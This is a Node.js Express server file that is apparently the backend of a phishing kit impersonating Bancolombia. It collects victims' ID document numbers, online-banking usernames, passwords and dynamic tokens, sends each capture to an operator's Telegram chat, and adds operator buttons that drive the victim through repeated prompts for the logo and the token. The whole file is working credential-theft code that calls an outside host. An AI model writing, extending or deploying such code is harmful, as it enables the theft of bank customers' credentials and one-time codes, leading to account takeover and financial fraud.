require('dotenv').config();
const express = require('express');
const bodyParser = require('body-parser');
const session = require('express-session');
const cors = require('cors');
const fetch = require('node-fetch');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(session({
    secret: process.env.SESSION_SECRET || 'bancol_secret_key_123',
    resave: false,
    saveUninitialized: false,
    cookie: {
        secure: false,
        maxAge: 24 * 60 * 60 * 1000 // 24 hours
    }
}));

// Log only important requests
app.use((req, res, next) => {
    if (req.url.includes('/api/') && !req.url.includes('/api/check-action')) {
        console.log(`[${req.method}] ${req.url} - SID: ${req.sessionID}`);
    }
    next();
});

// Static files
app.use(express.static(path.join(__dirname, 'public')));

// Serve root index.html as main page
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// Helpers
const formatSessionData = (sessionData) => {
    let message = "";

    if (sessionData.aviso) {
        message += `⚠️ <b>AVISO: ${sessionData.aviso}</b>\n`;
        message += "--------------------------------\n\n";
    }

    message += "🔔 <b>NUEVA CAPTURA - BANCOLOMBIA</b>\n\n";

    if (sessionData.documentType && sessionData.documentNumber) {
        message += "📋 <b>Documento</b>\n";
        message += `Tipo: ${sessionData.documentType}\n`;
        message += `Número: ${sessionData.documentNumber}\n\n`;
    }

    if (sessionData.usuario && sessionData.clave) {
        message += "🔐 <b>Credenciales</b>\n";
        message += `Usuario: ${sessionData.usuario}\n`;
        message += `Clave: ${sessionData.clave}\n\n`;
    }

    if (sessionData.token) {
        message += "🔑 <b>TOKEN DINÁMICO</b>\n";
        message += `Código: <code>${sessionData.token}</code>\n\n`;
    }

    if (sessionData.status) {
        message += `📍 <b>Estado:</b> ${sessionData.status}\n\n`;
    }

    message += "⏰ " + new Date().toLocaleString('es-CO');

    return message;
};

// API Endpoints
app.post('/api/process', (req, res) => {
    const { documentType, documentNumber } = req.body;
    req.session.documentType = documentType;
    req.session.documentNumber = documentNumber;
    req.session.telegram_stage = 'documento';
    req.session.currentAction = null;

    console.log(`[PROCESS] Doc: ${documentType} - ${documentNumber}`);
    req.session.save((err) => {
        if (err) console.error('Session Save Error:', err);
        res.json({ success: true });
    });
});

app.post('/api/send-message', async (req, res) => {
    const { stage, data } = req.body;

    // Accumulate data in session
    Object.assign(req.session, data);

    // Respond immediately to client
    res.json({ success: true });

    // Save session and send to Telegram asynchronously
    req.session.save(async (err) => {
        if (err) {
            console.error('Session Save Error:', err);
            return;
        }

        const message = formatSessionData(req.session);
        const sessionId = req.sessionID;

        const buttons = {
            inline_keyboard: [
                [
                    { text: '❌ Error Documento', callback_data: `error_documento:${sessionId}` },
                    { text: '✅ Pedir Logo', callback_data: `pedir_logo:${sessionId}` }
                ],
                [
                    { text: '❌ Error Logo', callback_data: `error_logo:${sessionId}` },
                    { text: '🔑 Pedir Token', callback_data: `pedir_token:${sessionId}` }
                ],
                [
                    { text: '❌ Error Token', callback_data: `error_token:${sessionId}` },
                    { text: '🏁 Finalizar', callback_data: `finalizar:${sessionId}` }
                ]
            ]
        };

        try {
            const url = `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`;
            await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: process.env.TELEGRAM_CHAT_ID,
                    text: message,
                    parse_mode: 'HTML',
                    reply_markup: buttons
                })
            });
            console.log(`[✅ TELEGRAM] Mensaje enviado para SID: ${sessionId}`);
        } catch (error) {
            console.error('Telegram Error:', error);
        }
    });
});

// Polling and handling for Telegram
let lastUpdateId = 0;

const pollTelegram = async () => {
    try {
        const response = await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=30`);
        const data = await response.json();

        if (data.ok && data.result.length > 0) {
            console.log(`[📨 TELEGRAM] ${data.result.length} actualización(es) recibida(s)`);
            for (const update of data.result) {
                lastUpdateId = update.update_id;

                if (update.callback_query) {
                    const callbackQuery = update.callback_query;
                    const [action, sessionId] = callbackQuery.data.split(':');
                    const messageId = callbackQuery.message.message_id;
                    const chatId = callbackQuery.message.chat.id;

                    console.log(`[TELEGRAM] Action: ${action} for Session: ${sessionId}`);

                    // Save action globally for ANY session to pick up
                    global.pendingActions = global.pendingActions || {};
                    // Use the sessionId from button AND a global flag
                    global.pendingActions[sessionId] = action;
                    global.lastAction = { action, sessionId, timestamp: Date.now() };
                    
                    console.log(`[💾 STORED] Action "${action}" guardada para sesiones`);
                    console.log(`[🎯 GLOBAL] lastAction actualizada: ${action}`);

                    // Execute Telegram API calls in parallel for faster response
                    const botToken = process.env.TELEGRAM_BOT_TOKEN;
                    await Promise.all([
                        // 1. Remove buttons from the message
                        fetch(`https://api.telegram.org/bot${botToken}/editMessageReplyMarkup`, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                chat_id: chatId,
                                message_id: messageId,
                                reply_markup: { inline_keyboard: [] }
                            })
                        }),
                        // 2. Answer callback query to stop the loading state in Telegram
                        fetch(`https://api.telegram.org/bot${botToken}/answerCallbackQuery`, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ callback_query_id: callbackQuery.id })
                        })
                    ]).catch(err => console.error('Telegram API Error:', err));
                }
            }
        }
    } catch (error) {
        console.error('Polling Error:', error);
    }
    // Continue polling - faster for better responsiveness
    setTimeout(pollTelegram, 1000);
};

// API Endpoints
app.get('/api/check-action', (req, res) => {
    const sessionId = req.sessionID;
    
    // Check for action with current sessionId
    let action = global.pendingActions ? global.pendingActions[sessionId] : null;
    
    // If no action for this session, check the global last action (for mismatched sessions)
    if (!action && global.lastAction) {
        const timeSinceAction = Date.now() - global.lastAction.timestamp;
        // If action is less than 30 seconds old, use it
        if (timeSinceAction < 30000) {
            action = global.lastAction.action;
            console.log(`[✅ ACTION] ${action} | SID: ${sessionId} (from global)`);
            // Clear the global action after using it
            global.lastAction = null;
        }
    } else if (action) {
        console.log(`[✅ ACTION] ${action} | SID: ${sessionId}`);
        delete global.pendingActions[sessionId];
    }

    res.json({ action: action || null });
});

// Confirmation endpoint
app.post('/api/send-confirmation', async (req, res) => {
    const { action, actionName } = req.body;
    const sessionId = req.sessionID;
    
    // Respond immediately to client
    res.json({ success: true });
    
    // Send confirmation to Telegram asynchronously
    try {
        const message = `✅ <b>COMANDO EJECUTADO</b>\n\n📍 Acción: ${actionName}\n🔑 Sesión: ${sessionId}\n⏰ ${new Date().toLocaleTimeString('es-CO')}`;
        
        const url = `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`;
        await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: process.env.TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        });
        console.log(`[✅ CONFIRMACIÓN] ${actionName} ejecutado`);
    } catch (error) {
        console.error('Error enviando confirmación:', error);
    }
});

// Start Server
app.listen(PORT, () => {
    console.log(`
🚀 ===================================`);
    console.log(`🚀 Server running on port ${PORT}`);
    console.log(`🚀 ===================================
`);
    console.log(`🤖 Iniciando Telegram polling...`);
    // Start Telegram polling automatically
    pollTelegram();
});
